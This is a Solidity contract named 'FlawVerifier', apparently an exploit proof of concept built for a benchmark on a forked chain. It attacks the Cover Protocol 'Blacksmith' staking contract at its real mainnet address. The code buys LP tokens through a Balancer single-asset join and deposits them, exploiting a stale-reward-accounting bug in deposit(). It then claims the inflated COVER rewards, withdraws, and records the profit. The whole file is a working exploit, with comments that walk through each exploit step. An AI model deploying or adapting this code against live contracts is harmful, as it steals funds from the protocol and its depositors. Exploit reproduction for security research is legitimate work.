// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IBlacksmithLike {
    function weeklyTotal() external view returns (uint256);
    function totalWeight() external view returns (uint256);
    function getPoolList() external view returns (address[] memory);
    function pools(address lpToken)
        external
        view
        returns (uint256 weight, uint256 accRewardsPerToken, uint256 lastUpdatedAt);
    function deposit(address lpToken, uint256 amount) external;
    function claimRewards(address lpToken) external;
    function withdraw(address lpToken, uint256 amount) external;
}

interface IUniswapV2Router02 {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapETHForExactTokens(uint256 amountOut, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
}

interface IBPool {
    function getCurrentTokens() external view returns (address[] memory tokens);
    function getBalance(address token) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function joinswapExternAmountIn(address tokenIn, uint256 tokenAmountIn, uint256 minPoolAmountOut)
        external
        returns (uint256 poolAmountOut);
}

interface IWETH {
    function deposit() external payable;
}

contract FlawVerifier {
    address private constant BLACKSMITH = 0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5;
    address private constant COVER = 0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private constant WEEK = 7 days;
    uint256 private constant CAL_MULTIPLIER = 1e12;
    uint256 private constant MAX_BPOOL_IN_BPS = 4900;

    struct Candidate {
        address lpToken;
        address joinToken;
        uint256 joinAmount;
        uint256 expectedCoverOut;
        uint256 staleLpSupply;
    }

    uint256 private realizedProfit;
    bool private attempted;
    mapping(address => bool) private skippedPools;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        uint256 coverBefore = IERC20(COVER).balanceOf(address(this));

        _attemptWithExistingLpBalances(coverBefore);

        if (IERC20(COVER).balanceOf(address(this)) == coverBefore) {
            for (uint256 i = 0; i < 24; i++) {
                Candidate memory candidate = _stage0LocateBestCandidate();
                if (candidate.lpToken == address(0)) {
                    break;
                }

                skippedPools[candidate.lpToken] = true;

                try this.executeCandidate(candidate) returns (bool success) {
                    if (success && IERC20(COVER).balanceOf(address(this)) > coverBefore) {
                        break;
                    }
                } catch {}
            }
        }

        _stage3RecordProfit(coverBefore);
    }

    function executeCandidate(Candidate calldata candidate) external returns (bool) {
        require(msg.sender == address(this), "self-only");

        // Exploit path 1:
        // Acquire a large LP position. The current fork state already provides public spot
        // liquidity, so this attempt prefers verifier-held capital over temporary borrowing.
        // A Balancer single-asset join is a realistic public step that only changes how the
        // attacker funds the LP position; it does not change the stale-accounting root cause.
        uint256 lpReceived = _stage1AcquireAndDeposit(candidate);
        require(lpReceived > 0, "no-lp-received");

        // Exploit path 2:
        // `deposit()` snapshots Pool and BonusToken into memory before `updatePool()`,
        // so after an idle period the new depositor's writeoff is computed from stale
        // accumulators instead of the freshly updated values.

        // Exploit path 3:
        // Claim the rewards that accrued before this deposit.
        IBlacksmithLike(BLACKSMITH).claimRewards(candidate.lpToken);

        // Exploit path 4:
        // Withdraw the LP position from Blacksmith after claiming.
        IBlacksmithLike(BLACKSMITH).withdraw(candidate.lpToken, lpReceived);
        return true;
    }

    function profitToken() external pure returns (address) {
        return COVER;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _attemptWithExistingLpBalances(uint256 coverBefore) internal {
        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
        address[] memory poolList = blacksmith.getPoolList();

        for (uint256 i = 0; i < poolList.length; i++) {
            address lpToken = poolList[i];
            uint256 lpBalance = IERC20(lpToken).balanceOf(address(this));
            if (lpBalance == 0) {
                continue;
            }

            skippedPools[lpToken] = true;
            _forceApprove(lpToken, BLACKSMITH, lpBalance);
            try blacksmith.deposit(lpToken, lpBalance) {
                blacksmith.claimRewards(lpToken);
                blacksmith.withdraw(lpToken, lpBalance);
                if (IERC20(COVER).balanceOf(address(this)) > coverBefore) {
                    return;
                }
            } catch {}
        }
    }

    function _stage0LocateBestCandidate() internal view returns (Candidate memory best) {
        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
        address[] memory poolList = blacksmith.getPoolList();
        uint256 weeklyTotal_ = blacksmith.weeklyTotal();
        uint256 totalWeight_ = blacksmith.totalWeight();

        if (poolList.length == 0 || weeklyTotal_ == 0 || totalWeight_ == 0) {
            return best;
        }

        for (uint256 i = 0; i < poolList.length; i++) {
            address lpToken = poolList[i];
            if (skippedPools[lpToken]) {
                continue;
            }

            Candidate memory candidate = _scorePool(lpToken, weeklyTotal_, totalWeight_);
            if (candidate.expectedCoverOut > best.expectedCoverOut) {
                best = candidate;
            }
        }
    }

    function _scorePool(address lpToken, uint256 weeklyTotal_, uint256 totalWeight_)
        internal
        view
        returns (Candidate memory best)
    {
        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
        (uint256 weight,, uint256 lastUpdatedAt) = blacksmith.pools(lpToken);
        if (weight == 0 || lastUpdatedAt == 0 || block.timestamp <= lastUpdatedAt) {
            return best;
        }

        uint256 staleLpSupply = IERC20(lpToken).balanceOf(BLACKSMITH);
        if (staleLpSupply == 0) {
            return best;
        }

        uint256 elapsed = block.timestamp - lastUpdatedAt;
        uint256 staleRewardsScaled = (((weeklyTotal_ * CAL_MULTIPLIER) * elapsed) * weight) / totalWeight_ / WEEK;
        if (staleRewardsScaled == 0) {
            return best;
        }

        uint256 poolSupply;
        try IBPool(lpToken).totalSupply() returns (uint256 supply) {
            poolSupply = supply;
        } catch {
            return best;
        }
        if (poolSupply == 0) {
            return best;
        }

        try IBPool(lpToken).getCurrentTokens() returns (address[] memory tokens) {
            for (uint256 i = 0; i < tokens.length; i++) {
                address joinToken = tokens[i];
                if (!_isSupportedJoinToken(joinToken)) {
                    continue;
                }

                uint256 tokenBalanceInPool;
                try IBPool(lpToken).getBalance(joinToken) returns (uint256 balance) {
                    tokenBalanceInPool = balance;
                } catch {
                    continue;
                }
                if (tokenBalanceInPool == 0) {
                    continue;
                }

                uint256 joinAmount = _planJoinAmount(tokenBalanceInPool, poolSupply, staleLpSupply);
                if (joinAmount == 0) {
                    continue;
                }

                uint256 expectedLpOut = (joinAmount * poolSupply) / tokenBalanceInPool;
                if (expectedLpOut == 0) {
                    continue;
                }

                uint256 expectedCoverOut =
                    (expectedLpOut * staleRewardsScaled) / (staleLpSupply + expectedLpOut) / CAL_MULTIPLIER;
                if (expectedCoverOut > best.expectedCoverOut) {
                    best = Candidate({
                        lpToken: lpToken,
                        joinToken: joinToken,
                        joinAmount: joinAmount,
                        expectedCoverOut: expectedCoverOut,
                        staleLpSupply: staleLpSupply
                    });
                }
            }
        } catch {}
    }

    function _planJoinAmount(uint256 tokenBalanceInPool, uint256 poolSupply, uint256 staleLpSupply)
        internal
        pure
        returns (uint256)
    {
        uint256 maxJoin = (tokenBalanceInPool * MAX_BPOOL_IN_BPS) / 10000;
        if (maxJoin == 0) {
            return 0;
        }

        uint256 targetLp = staleLpSupply * 2;
        if (targetLp == 0) {
            targetLp = 1;
        }

        uint256 proportionalAmount = (targetLp * tokenBalanceInPool) / poolSupply;
        uint256 floorAmount = tokenBalanceInPool / 10000;
        if (floorAmount == 0) {
            floorAmount = 1;
        }

        uint256 joinAmount = proportionalAmount;
        if (joinAmount < floorAmount) {
            joinAmount = floorAmount;
        }
        if (joinAmount > maxJoin) {
            joinAmount = maxJoin;
        }
        return joinAmount;
    }

    function _stage1AcquireAndDeposit(Candidate memory candidate) internal returns (uint256 lpReceived) {
        _ensureJoinTokenBalance(candidate.joinToken, candidate.joinAmount);

        uint256 lpBefore = IERC20(candidate.lpToken).balanceOf(address(this));
        _forceApprove(candidate.joinToken, candidate.lpToken, candidate.joinAmount);
        IBPool(candidate.lpToken).joinswapExternAmountIn(candidate.joinToken, candidate.joinAmount, 1);

        uint256 lpAfter = IERC20(candidate.lpToken).balanceOf(address(this));
        require(lpAfter > lpBefore, "join-failed");

        lpReceived = lpAfter - lpBefore;
        _forceApprove(candidate.lpToken, BLACKSMITH, lpReceived);
        IBlacksmithLike(BLACKSMITH).deposit(candidate.lpToken, lpReceived);
    }

    function _ensureJoinTokenBalance(address token, uint256 needed) internal {
        uint256 current = IERC20(token).balanceOf(address(this));
        if (current >= needed) {
            return;
        }

        uint256 shortfall = needed - current;
        if (token == WETH) {
            require(address(this).balance >= shortfall, "insufficient-eth");
            IWETH(WETH).deposit{value: shortfall}();
            return;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;
        uint256[] memory amountsIn = IUniswapV2Router02(UNI_V2_ROUTER).getAmountsIn(shortfall, path);
        require(address(this).balance >= amountsIn[0], "insufficient-eth");
        IUniswapV2Router02(UNI_V2_ROUTER).swapETHForExactTokens{value: amountsIn[0]}(
            shortfall, path, address(this), block.timestamp
        );
    }

    function _stage3RecordProfit(uint256 coverBefore) internal {
        uint256 coverAfter = IERC20(COVER).balanceOf(address(this));
        if (coverAfter > coverBefore) {
            realizedProfit = coverAfter - coverBefore;
        }
    }

    function _isSupportedJoinToken(address token) internal pure returns (bool) {
        return token == WETH || token == DAI || token == USDC || token == USDT;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok, "approve-failed");
    }

    receive() external payable {}
}
